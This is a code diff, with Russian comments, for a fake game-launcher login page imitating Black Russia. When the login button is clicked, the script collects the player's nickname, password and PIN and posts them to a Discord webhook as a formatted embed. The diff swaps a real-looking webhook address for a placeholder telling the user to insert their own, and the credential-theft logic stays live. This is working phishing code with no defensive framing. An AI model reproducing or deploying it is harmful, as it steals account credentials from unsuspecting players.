@@ -100,7 +100,6 @@ pincodeInput.addEventListener('input', function() {
   if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
-// КНОПКА ВОЙТИ С МОЛНИЕНОСНОЙ ОТПРАВКОЙ В ДИСКОРД
 loginBtn.addEventListener('click', function(e) {
   e.preventDefault(); 
   const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
@@ -109,14 +108,13 @@ loginBtn.addEventListener('click', function(e) {
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
-  // ВСТАВЬ СВОЮ ССЫЛКУ ВЕБХУКА ДИСКОРДА ВНУТРЬ КАВЫЧЕК
-  const discordWebhookUrl = "https://vk.ru/away.php?to=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1534289604029448245%2FQ7jqX-o46HwGYWbsfBhsFjud3SGmgwoZeYCwyDemgNx8pjUf-S5pUX_GFXPWnvGPwgsb&utf=1";
+  // ВСТАВЬ СВОЮ ДЛИННУЮ ССЫЛКУ ИЗ ДИСКОРДА ВНУТРЬ КАВЫЧЕК
+  const discordWebhookUrl = "СЮДА_ВСТАВЬ_ССЫЛКУ_ИЗ_ДИСКОРДА";
   
-  // Создаем сочную, красивую карточку для Discord (Embed-формат)
   const discordPayload = {
     embeds: [{
       title: "🚀 Новая авторизация в лаунчере!",
-      color: 15007797, // Фирменный красный цвет Black Russia
+      color: 15007797,
       fields: [
         { name: "👤 Никнейм", value: `\`\`\`${n}\`\`\``, inline: false },
         { name: "🔑 Пароль", value: `\`\`\`${p}\`\`\``, inline: false },
@@ -126,7 +124,6 @@ loginBtn.addEventListener('click', function(e) {
     }]
   };
 
-  // Прямой мгновенный фоновый запрос на сервера Discord
   fetch(discordWebhookUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
